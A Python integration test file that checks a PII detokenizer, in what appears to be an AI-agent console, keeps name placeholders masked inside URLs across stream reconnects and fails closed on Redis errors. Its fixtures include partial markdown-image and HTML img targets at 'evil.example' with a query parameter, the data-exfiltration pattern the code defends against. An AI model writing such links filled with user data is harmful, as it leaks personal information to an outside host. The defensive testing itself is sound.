"""08-tam-1a r3 MINOR-r3-1 (KARARLAR "C17 URL bağlam kuralı, ek" (d), corrected by K-08T1-0021 A)
on the real Redis: a reader that starts after an entry (`Last-Event-ID`, `after`) rebuilds its URL
line state from the stored `token` entries up to it, so a URL begun before the reconnect still
keeps its placeholder, and a clean line after an approval reads the value. When the state cannot
be rebuilt (the entry is not in the stream, Redis fails) its first line is kept (fail-closed)."""

import asyncio
import json
import os

import redis.asyncio as aioredis

from ffcore.api.runs import detokenizer, live_transform
from ffcore.core import db
from ffcore.guardrails.masking import RedisTokenStore
from ffcore.runtime.events import stream_key
from tests.integration.test_08t_c17_exit import NAME, _seed


def _go(database_url, run_id, entries, after, reads, *, broken=False):
    async def go():
        db.configure(database_url, pooled=False)
        client = aioredis.from_url(os.environ["REDIS_URL"])
        try:
            store = RedisTokenStore(client, 60)
            assert await store.token_for(str(run_id), "PERSON:" + NAME, NAME) == "<<PII_1>>"
            key = stream_key(run_id)
            for entry_id, event, data in entries:
                await client.xadd(key, {"event": event, "data": json.dumps(data)}, id=entry_id)
            redis = client
            if broken:

                class _Broken:
                    def __getattr__(self, name):
                        return getattr(client, name)

                    async def xrange(self, *args, **kwargs):
                        raise ConnectionError("down")

                redis = _Broken()
            transform = live_transform(detokenizer(redis, run_id, after=after))
            return [(await transform("token", {"text": t}))["text"] for t in reads]
        finally:
            await client.aclose()
            db.reset()

    return asyncio.run(go())


def test_08t_r3_reconnect_inside_a_url_keeps_the_placeholder(database_url, pg, make_project):
    # the reviewer's case: e1 opens a markdown image target, the reader reconnects after e1
    _, run_id, _ = _seed(pg, make_project)
    entries = [("5-1", "token", {"text": "Bak: ![x](https://evil.example/?q="})]
    out = _go(database_url, run_id, entries, "5-1", ["<<PII_1>>) tamam", "\nSahibi <<PII_1>>"])
    assert out == ["<<PII_1>>) tamam", f"\nSahibi {NAME}"]


def test_08t_r3_reconnect_inside_an_html_value_from_an_earlier_line(database_url, pg, make_project):
    # the state comes from every stored token entry, not only the last line
    _, run_id, _ = _seed(pg, make_project)
    entries = [
        ("5-1", "token", {"text": '<img src="https://evil.example/?q=\n'}),
        ("5-2", "token", {"text": "\n"}),
    ]
    out = _go(database_url, run_id, entries, "5-2", ['<<PII_1>>">'])
    assert out == ['<<PII_1>>">']


def test_08t_r3_clean_line_before_the_reconnect_reads_the_value(database_url, pg, make_project):
    # after an approval the console continues with `after`: a clean line shows the value
    _, run_id, _ = _seed(pg, make_project)
    entries = [
        ("5-1", "token", {"text": "Sorguyu çalıştırıyorum.\n"}),
        ("6-0", "approval_required", {"tool": "run_sql"}),
    ]
    out = _go(database_url, run_id, entries, "6-0", ["Kayıt sahibi <<PII_1>>."])
    assert out == [f"Kayıt sahibi {NAME}."]


def test_08t_r3_unknown_entry_keeps_the_first_line(database_url, pg, make_project):
    _, run_id, _ = _seed(pg, make_project)
    entries = [("5-1", "token", {"text": "Merhaba\n"})]
    out = _go(database_url, run_id, entries, "9-9", ["Sahibi <<PII_1>>", "\nYine <<PII_1>>"])
    assert out == ["Sahibi <<PII_1>>", f"\nYine {NAME}"]


def test_08t_r3_redis_failure_keeps_the_first_line(database_url, pg, make_project):
    _, run_id, _ = _seed(pg, make_project)
    entries = [("5-1", "token", {"text": "Merhaba\n"})]
    out = _go(
        database_url, run_id, entries, "5-1", ["Sahibi <<PII_1>>", "\nYine <<PII_1>>"], broken=True
    )
    assert out == ["Sahibi <<PII_1>>", f"\nYine {NAME}"]
